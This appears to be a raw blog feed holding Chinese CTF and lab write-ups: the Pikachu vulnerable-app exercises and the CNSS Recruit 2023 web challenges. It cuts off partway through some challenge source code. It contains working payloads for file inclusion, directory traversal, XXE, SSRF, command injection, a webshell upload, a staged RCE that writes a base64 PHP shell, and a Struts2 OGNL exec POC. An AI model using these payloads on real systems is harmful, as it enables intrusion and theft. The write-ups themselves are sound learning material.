title="ä¸å®‰å…¨çš„æ–‡ä»¶ä¸‹è½½"></a>ä¸å®‰å…¨çš„æ–‡ä»¶ä¸‹è½½</h3><h4 id="1-ä¸å®‰å…¨çš„æ–‡ä»¶ä¸‹è½½"><a href="#1-ä¸å®‰å…¨çš„æ–‡ä»¶ä¸‹è½½" class="headerlink" title="1.ä¸å®‰å…¨çš„æ–‡ä»¶ä¸‹è½½"></a>1.ä¸å®‰å…¨çš„æ–‡ä»¶ä¸‹è½½</h4><p>æƒ³æ‰¾ç§‘æ¯”çš„è·¯å¾„ï¼Œçœ‹åˆ°äº†æœ‰æ„æ€çš„ä¸œè¥¿</p><p><img src="https://bu.dusays.com/2023/11/03/65450f34ac402.png"></p><p>ä¿®æ”¹è·¯å¾„</p><p><img src="https://bu.dusays.com/2023/11/03/65450f3584d1d.png"></p><p>ç‚¹å‡»æˆåŠŸä¸‹è½½</p><h3 id="Unsafe-file-upload"><a href="#Unsafe-file-upload" class="headerlink" title="Unsafe file upload"></a>Unsafe file upload</h3><h4 id="1-å®¢æˆ·ç«¯check"><a href="#1-å®¢æˆ·ç«¯check" class="headerlink" title="1.å®¢æˆ·ç«¯check"></a>1.å®¢æˆ·ç«¯check</h4><p>è¿™é‡ŒæŠ“åŒ…æ”¹åç¼€æˆ–è€…æµè§ˆå™¨å…³é—­jséƒ½å¯ä»¥ï¼Œæˆ‘é€‰æ‹©åè€…</p><h4 id="2-æœåŠ¡ç«¯check"><a href="#2-æœåŠ¡ç«¯check" class="headerlink" title="2.æœåŠ¡ç«¯check"></a>2.æœåŠ¡ç«¯check</h4><p>è¿™é‡Œç›´æ¥æŠ“åŒ…æ”¹åç¼€å°±è¡Œ</p><h4 id="3-getimagesize"><a href="#3-getimagesize" class="headerlink" title="3.getimagesize()"></a>3.getimagesize()</h4><p>å¤§å°ä¸å¯¹çš„å›¾ç‰‡ä¼šè¢«æ‰“å›æ¥ï¼Œå…ˆåœ¨æ­£å¸¸å›¾ç‰‡ä¸­æ’å…¥ä¸€å¥è¯æœ¨é©¬ï¼Œä½†ä¸ä¼šæ‰§è¡Œphpè¯­å¥ï¼Œåªèƒ½ç»“åˆä¸Šä¸Šå…³çš„æ–‡ä»¶åŒ…å«æ¼æ´</p><p>playload:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/pikachu/vul/fileinclude/fi_local.php?filename=../../unsafeupload/uploads/shell.php&amp;submit=%E6%8F%90%E4%BA%A4</span><br></pre></td></tr></table></figure><h3 id="Over-permission"><a href="#Over-permission" class="headerlink" title="Over permission"></a>Over permission</h3><h4 id="1-æ°´å¹³è¶Šæƒ"><a href="#1-æ°´å¹³è¶Šæƒ" class="headerlink" title="1.æ°´å¹³è¶Šæƒ"></a>1.æ°´å¹³è¶Šæƒ</h4><p><img src="https://bu.dusays.com/2023/11/03/65450f364fa01.png"></p><p>åœ¨urlè¿™é‡ŒæŠŠusernameæ”¹æˆåˆ«çš„ç”¨æˆ·</p><h4 id="2-å‚ç›´è¶Šæƒ"><a href="#2-å‚ç›´è¶Šæƒ" class="headerlink" title="2.å‚ç›´è¶Šæƒ"></a>2.å‚ç›´è¶Šæƒ</h4><p>ç™»å½•adminè´¦æˆ·ï¼Œç‚¹å‡»æ·»åŠ è´¦æˆ·ï¼Œå¹¶ä¸”è®°ä½url:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/pikachu/vul/overpermission/op2/op2_admin_edit.php</span><br></pre></td></tr></table></figure><p>ç™»å½•æ™®é€špikachuè´¦æˆ·ï¼Œç„¶åç›´æ¥å¤åˆ¶ä¸Šé¢çš„é“¾æ¥è¿›è¡Œæ·»åŠ è´¦æˆ·ï¼Œå†ç™»å½•adminè´¦æˆ·ï¼Œå‘ç°æˆåŠŸæ·»åŠ ï¼Œé‚£ä¹ˆå°±å­˜åœ¨å‚ç›´è¶Šæƒã€‚</p><h3 id=""><a href="#" class="headerlink" title="..&#x2F;..&#x2F;"></a>..&#x2F;..&#x2F;</h3><h4 id="1-ç›®å½•éå†"><a href="#1-ç›®å½•éå†" class="headerlink" title="1.ç›®å½•éå†"></a>1.ç›®å½•éå†</h4><p>playload:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/pikachu/vul/dir/dir_list.php?title=../../../../../../Windows/win.ini</span><br></pre></td></tr></table></figure><h4 id="æ•æ„Ÿä¿¡æ¯æ³„éœ²"><a href="#æ•æ„Ÿä¿¡æ¯æ³„éœ²" class="headerlink" title="æ•æ„Ÿä¿¡æ¯æ³„éœ²"></a>æ•æ„Ÿä¿¡æ¯æ³„éœ²</h4><h4 id="1-find-abc"><a href="#1-find-abc" class="headerlink" title="1.find abc"></a>1.find abc</h4><p><img src="https://bu.dusays.com/2023/11/03/65450f3723338.png"></p><p>f12æ‰¾åˆ°è´¦æˆ·</p><p><img src="https://bu.dusays.com/2023/11/03/65450f384accc.png"></p><p>é»„é‡‘æ—¶ä»£ğŸ‘æˆ‘ä¹Ÿå¾ˆå–œæ¬¢è¿™ä¸€æ®µ</p><p><img src="https://bu.dusays.com/2023/11/03/65450f390c059.png"></p><p>å¯ä»¥ç›´æ¥ä¿®æ”¹urlå¾—åˆ°æ•æ„Ÿä¿¡æ¯</p><h3 id="PHPååºåˆ—åŒ–"><a href="#PHPååºåˆ—åŒ–" class="headerlink" title="PHPååºåˆ—åŒ–"></a>PHPååºåˆ—åŒ–</h3><h4 id="1-PHPååºåˆ—åŒ–æ¼æ´"><a href="#1-PHPååºåˆ—åŒ–æ¼æ´" class="headerlink" title="1.PHPååºåˆ—åŒ–æ¼æ´"></a>1.PHPååºåˆ—åŒ–æ¼æ´</h4><p>æ²¡æ‰¾åˆ°ååºåˆ—åŒ–çš„ä»£ç ï¼Œè¯•äº†ä¸€ä¸‹ç»™çš„playload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">1</span>:<span class="string">&quot;S&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>;s:<span class="number">29</span>:<span class="string">&quot;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><p>å‘ç°å¯ä»¥</p><h3 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h3><h4 id="1-XXEæ¼æ´"><a href="#1-XXEæ¼æ´" class="headerlink" title="1.XXEæ¼æ´"></a>1.XXEæ¼æ´</h4><p>playload:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">foo</span> [    </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///c:/windows/win.ini&quot;</span> &gt;</span> ]&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">foo</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="urlé‡å®šå‘"><a href="#urlé‡å®šå‘" class="headerlink" title="urlé‡å®šå‘"></a>urlé‡å®šå‘</h3><h4 id="1-ä¸å®‰å…¨çš„urlè·³è½¬"><a href="#1-ä¸å®‰å…¨çš„urlè·³è½¬" class="headerlink" title="1.ä¸å®‰å…¨çš„urlè·³è½¬"></a>1.ä¸å®‰å…¨çš„urlè·³è½¬</h4><p><img src="https://bu.dusays.com/2023/11/03/65450f39dfdb7.png"></p><p>å¦‚å›¾ä¿®æ”¹ï¼Œç‚¹å‡»åˆ™è·³è½¬ç™¾åº¦</p><h3 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h3><h4 id="1-SSRF-curl"><a href="#1-SSRF-curl" class="headerlink" title="1.SSRF(curl)"></a>1.SSRF(curl)</h4><p>playload:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/pikachu/vul/ssrf/ssrf_curl.php?url=file:///c:/Windows/win.ini</span><br></pre></td></tr></table></figure><h4 id="2-SSRF-file-get-content"><a href="#2-SSRF-file-get-content" class="headerlink" title="2.SSRF(file_get_content)"></a>2.SSRF(file_get_content)</h4><p>playload:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/pikachu/vul/ssrf/ssrf_fgc.php?file=file:///c:/windows/win.ini</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;YuLin-2023-Recruit-Writeup&quot;&gt;&lt;a href=&quot;#YuLin-2023-Recruit-Writeup&quot; class=&quot;headerlink&quot; title=&quot;YuLin 2023 Recruit Writeup&quot;&gt;&lt;/a&gt;YuLin 20</summary>
      
    
    
    
    <category term="writeup" scheme="https://foreon.github.io/categories/writeup/"/>
    
    
    <category term="ctf" scheme="https://foreon.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>CNSS Recruit 2023 Writeup</title>
    <link href="https://foreon.github.io/posts/16427.html"/>
    <id>https://foreon.github.io/posts/16427.html</id>
    <published>2023-11-03T15:47:10.000Z</published>
    <updated>2023-11-03T15:56:20.139Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CNSS-Recruit-2023-Writeup"><a href="#CNSS-Recruit-2023-Writeup" class="headerlink" title="CNSS Recruit 2023 Writeup"></a>CNSS Recruit 2023 Writeup</h1><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="1-ğŸ“—-CNSS-2023-Web-Guideline"><a href="#1-ğŸ“—-CNSS-2023-Web-Guideline" class="headerlink" title="1.ğŸ“— CNSS 2023 Web Guideline"></a>1.ğŸ“— CNSS 2023 Web Guideline</h3><p>æ²¡ä»€ä¹ˆå¥½è¯´çš„</p><h3 id="2-ğŸ™‹-PHPinfo"><a href="#2-ğŸ™‹-PHPinfo" class="headerlink" title="2.ğŸ™‹ PHPinfo"></a>2.ğŸ™‹ PHPinfo</h3><p>&#x2F;phpinfo()æ‰¾åˆ°flag</p><h3 id="3-ğŸ¦´-babyHTTP"><a href="#3-ğŸ¦´-babyHTTP" class="headerlink" title="3.ğŸ¦´ babyHTTP"></a>3.ğŸ¦´ babyHTTP</h3><p>æŒ‰æç¤ºæ¥å°±è¡Œ</p><h3 id="4-ğŸ“-Ping"><a href="#4-ğŸ“-Ping" class="headerlink" title="4.ğŸ“ Ping"></a>4.ğŸ“ Ping</h3><p>ping 127.0.0.1;ls &#x2F; # æ‰¾åˆ°flag</p><p>ping 127.0.01;cat &#x2F;flag # å¾—åˆ°flag</p><h3 id="5-ğŸ¥‡-æˆ‘å¾—å†å¿«ç‚¹"><a href="#5-ğŸ¥‡-æˆ‘å¾—å†å¿«ç‚¹" class="headerlink" title="5.ğŸ¥‡ æˆ‘å¾—å†å¿«ç‚¹"></a>5.ğŸ¥‡ æˆ‘å¾—å†å¿«ç‚¹</h3><p>è„šæœ¬å¦‚ä¸‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">s=requests.Session()</span><br><span class="line">url=<span class="string">&#x27;http://124.221.34.13:55590/&#x27;</span></span><br><span class="line">r=s.get(url)</span><br><span class="line"></span><br><span class="line">res=r.text</span><br><span class="line"></span><br><span class="line">a=res.find(<span class="string">&quot;&lt;p&gt;&quot;</span>)</span><br><span class="line">b=res.find(<span class="string">&quot;/p&gt;&quot;</span>,a)</span><br><span class="line"><span class="comment">#æ‰¾åˆ°æˆ‘ä»¬è¦è®¡ç®—çš„å¼å­çš„å‰åä½ç½®</span></span><br><span class="line">num=res[a+<span class="number">9</span>:b-<span class="number">28</span>]</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"><span class="built_in">print</span>(b)</span><br><span class="line"><span class="built_in">print</span>(num)</span><br><span class="line"></span><br><span class="line">m = hashlib.md5()</span><br><span class="line">m.update(num.encode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line">encodeStr = m.hexdigest()</span><br><span class="line"><span class="built_in">print</span> (encodeStr)</span><br><span class="line">en=<span class="built_in">str</span>.upper(encodeStr)</span><br><span class="line"><span class="built_in">print</span>(en)</span><br><span class="line">playload=&#123;</span><br><span class="line">    <span class="string">&#x27;value&#x27;</span>:en</span><br><span class="line">&#125;</span><br><span class="line">r=s.get(url=url,params=playload)</span><br><span class="line"><span class="built_in">print</span>(r.content)</span><br><span class="line">url2=<span class="string">&#x27;http://124.221.34.13:55590/check?value=&#x27;</span>+encodeStr</span><br><span class="line">r2=s.get(url2)</span><br><span class="line"><span class="built_in">print</span>(r2.text)</span><br></pre></td></tr></table></figure><h3 id="ğŸ¶-CNSSå¨˜ã®å® ç‰©å•†åº—"><a href="#ğŸ¶-CNSSå¨˜ã®å® ç‰©å•†åº—" class="headerlink" title="ğŸ¶ CNSSå¨˜ã®å® ç‰©å•†åº—"></a>ğŸ¶ CNSSå¨˜ã®å® ç‰©å•†åº—</h3><p>ä½¿ç”¨åŒç­‰å·ç»•è¿‡ï¼ŒåŸç†ï¼š</p><p>![](G:\hexo-blog\source_posts\CNSS Recruit 2023 Writeup.assets\65450d1eb6ea8.png)å¯†ç è¾“å…¥â€™&#x3D;â€˜</p><img src="G:\hexo-blog\source\_posts\CNSS Recruit 2023 Writeup.assets\65450d2c37796.png" title="" alt="" width="210"><p>![](G:\hexo-blog\source_posts\CNSS Recruit 2023 Writeup.assets\65450d34c9074.png)</p><h3 id="6-ğŸ¥µ-2048"><a href="#6-ğŸ¥µ-2048" class="headerlink" title="6.ğŸ¥µ 2048"></a>6.ğŸ¥µ 2048</h3><p>å¡äº†ä¸€ä¼šï¼Œå‘ç°æ‰€æœ‰æ•°æ®å˜åŒ–éƒ½åœ¨å‰ç«¯å®Œæˆçš„ï¼Œé‚£ä¹ˆåªè¦åœ¨å‰ç«¯åšæ–‡ç« å°±è¡Œã€‚çœ‹äº†ä¸€åœˆå°±æ”¹JavaScriptå§(æˆ‘ä¹‹å‰è¿˜ä¸çŸ¥é“JavaScriptæ–‡ä»¶èƒ½åœ¨æºä»£ç ç•Œé¢ä¿®æ”¹å¹¶ä¿å­˜çš„</p><p><img src="https://bu.dusays.com/2023/11/03/65450d3c4c89e.png"></p><p>æ‰¾åˆ°scoreçš„åˆ¤å®šæ¡ä»¶ç„¶åæ”¹æˆ0ä¿å­˜ï¼Œå¾—åˆ°flag</p><h3 id="7-ğŸ‘¤-æ¢ä¸ªå¤´åƒå…ˆ"><a href="#7-ğŸ‘¤-æ¢ä¸ªå¤´åƒå…ˆ" class="headerlink" title="7.ğŸ‘¤ æ¢ä¸ªå¤´åƒå…ˆ"></a>7.ğŸ‘¤ æ¢ä¸ªå¤´åƒå…ˆ</h3><p>å‘ç°åªèƒ½ä¸Šä¼ å›¾ç‰‡ï¼Œéšä¾¿ä¸Šä¼ ä¸€ä¸ªå›¾ç‰‡æœ¨é©¬ï¼Œç„¶åburpæŠ“åŒ…ï¼ŒæŠŠ.pngåç¼€æ”¹æˆ.phpï¼Œèšå‰‘è¿æ¥</p><h3 id="8-7ï¸âƒ£-EZRCCCCE"><a href="#8-7ï¸âƒ£-EZRCCCCE" class="headerlink" title="8.7ï¸âƒ£ EZRCCCCE"></a>8.7ï¸âƒ£ EZRCCCCE</h3><p>åœ¨timå¤§ä½¬çš„æç¤ºä¸‹åšå‡ºæ¥äº†</p><p>![](G:\hexo-blog\source_posts\CNSS Recruit 2023 Writeup.assets\65450d3fcb5f7.png)</p><p>è¿‡æ»¤äº†ä¸€äº›ä¸œè¥¿ï¼Œä½†æ˜¯é™åˆ¶é•¿åº¦äº†</p><p>æ˜æ˜¾è¦ç”¨å‘½ä»¤æ‹¼æ¥æ¥è¿‡é¢˜ï¼Œæ³¨æ„è¿™é‡Œçš„sandboxæ˜¯ç»™æˆ‘ä»¬åˆ›å»ºäº†ä¸€ä¸ªç§äººè·¯å¾„ï¼Œæˆ‘å°±æ˜¯å¡åœ¨è¿™ä¸€æ­¥äº†</p><p>playload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&gt;hp</span><br><span class="line">&gt;1.p\\</span><br><span class="line">&gt;d\&gt;\\</span><br><span class="line">&gt;\ -\\</span><br><span class="line">&gt;e64\\</span><br><span class="line">&gt;bas\\</span><br><span class="line">&gt;7\|\\</span><br><span class="line">&gt;XSk\\</span><br><span class="line">&gt;Fsx\\</span><br><span class="line">&gt;dFV\\</span><br><span class="line">&gt;kX0\\</span><br><span class="line">&gt;bCg\\</span><br><span class="line">&gt;XZh\\</span><br><span class="line">&gt;AgZ\\</span><br><span class="line">&gt;waH\\</span><br><span class="line">&gt;PD9\\</span><br><span class="line">&gt;o\ \\</span><br><span class="line">&gt;ech\\</span><br><span class="line">ls -t&gt;0</span><br><span class="line">sh 0</span><br></pre></td></tr></table></figure><p>è„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://124.221.34.13:55559/?6=&#123;0&#125;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+]start attack!!!&quot;</span>)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;payload.txt&quot;</span>,<span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> f:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*]&quot;</span> + url.<span class="built_in">format</span>(i.strip()))</span><br><span class="line">        s=requests.get(url.<span class="built_in">format</span>(i.strip()))</span><br><span class="line">        <span class="built_in">print</span>((s.text))</span><br><span class="line"><span class="comment">#æ£€æŸ¥æ˜¯å¦æ”»å‡»æˆåŠŸ</span></span><br><span class="line">test = requests.get(<span class="string">&quot;http://124.221.34.13:55559/sandbox/5466482a195fb9b91138de0cb507f8bf/1.php&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> test.status_code == requests.codes.ok:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*]Attack success!!!&quot;</span>)</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæ£€æŸ¥æˆåŠŸçš„è·¯å¾„è¦pwdæŸ¥ä¸€ä¸‹</p><p>![](G:\hexo-blog\source_posts\CNSS Recruit 2023 Writeup.assets\65450d448f878.png)</p><p>ç„¶åls &#x2F;çœ‹åˆ°flagæŠŠå®ƒcatå‡ºæ¥ï¼Œè¿™é‡Œæ³¨æ„åˆ†å·é—­åˆè¯­å¥</p><p><img src="https://bu.dusays.com/2023/11/03/65450d4725a6e.png"></p><p><img src="https://bu.dusays.com/2023/11/03/65450d59be0cc.png"></p><h3 id="10-ğŸ±-Tomcat-cat"><a href="#10-ğŸ±-Tomcat-cat" class="headerlink" title="10.ğŸ± Tomcat?cat~"></a>10.ğŸ± Tomcat?cat~</h3><p>çŒ«çŒ«å¯çˆ±æ</p><p>è¿™é¢˜è€ƒå¯Ÿstruts2æ¼æ´</p><p>![](G:\hexo-blog\source_posts\CNSS Recruit 2023 Writeup.assets\65450d4aaf617.png) </p><p>å‚è€ƒcsdnæ–‡ç« ï¼š<a href="https://blog.csdn.net/q20010619/article/details/120729447">CTFshowåˆ·é¢˜æ—¥è®°-WEB-JAVAï¼ˆweb279-300ï¼‰Struts2å…¨æ¼æ´å¤ç°ï¼ŒJavaæ¼æ´å¤ç°_debug&#x3D;command&amp;expressionè¡¨è¾¾å¼æ³¨å…¥æ¼æ´å¦‚ä½•ä¿®å¤_OceanSecçš„åšå®¢-CSDNåšå®¢</a></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POC:</span><br><span class="line"><span class="string">&#x27; + (#_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,#foo=new java.lang.Boolean(&quot;false&quot;) ,#context[&quot;xwork.MethodAccessor.denyMethodExecution&quot;]=#foo,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#x27;</span>cat webapps/flaaaaaaag/flag.jsp<span class="string">&#x27;).getInputStream())) + &#x27;</span></span><br></pre></td></tr></table></figure><p>è¿™é¢˜flagè—çš„æœ‰ç‚¹æ·±ï¼Œä¸€èˆ¬åœ¨ç›®å½•å°±çœ‹åˆ°äº†ï¼Œé—®äº†å¤§ä½¬æ‰åšå‡ºæ¥ï¼Œä¸€åº¦ä»¥ä¸ºæ–¹å‘é”™äº†ğŸ˜­</p><p>å¤§ä½¬è¯´æ˜¯struts2æœ‰ç‚¹å¤ªç®€å•äº†ï¼Œè—æ·±ç‚¹ä¸Šä¸Šéš¾åº¦</p><p>![](G:\hexo-blog\source_posts\CNSS Recruit 2023 Writeup.assets\65450da2e60d4.png)</p><h3 id="ğŸ”§-where-is-my-unserialize"><a href="#ğŸ”§-where-is-my-unserialize" class="headerlink" title="ğŸ”§ where is my unserialize?"></a>ğŸ”§ where is my unserialize?</h3><p>è¿™é¢˜å­¦åˆ°äº†ä¸å°‘ï¼Œä¹Ÿè¸©äº†ä¸å°‘å‘</p><p>é¦–å…ˆfile&#x3D;xxx.phpæ˜¯å¯ä»¥æŸ¥åŸç çš„</p><p>![](G:\hexo-blog\source_posts\CNSS Recruit 2023 Writeup.assets\65450da3c364c.png)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span>.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CNSS</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$shino</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$shin0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name=<span class="variable">$name</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;shin0 = <span class="string">&#x27;cnss&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">_sayhello</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">_sayhello</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> (<span class="string">&#x27;&lt;h1&gt;I know you are in a hurry, but don not rush yet.&lt;h1&gt;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;shin0 = <span class="variable language_">$this</span>-&gt;name;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;shin0.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CN55</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$params</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;params = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">_get</span>(<span class="string">&#x27;key&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">_get</span>(<span class="params"><span class="variable">$key</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;params[<span class="variable">$key</span>])) &#123;</span><br><span class="line">            <span class="variable">$value</span> = <span class="variable language_">$this</span>-&gt;params[<span class="variable">$key</span>];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            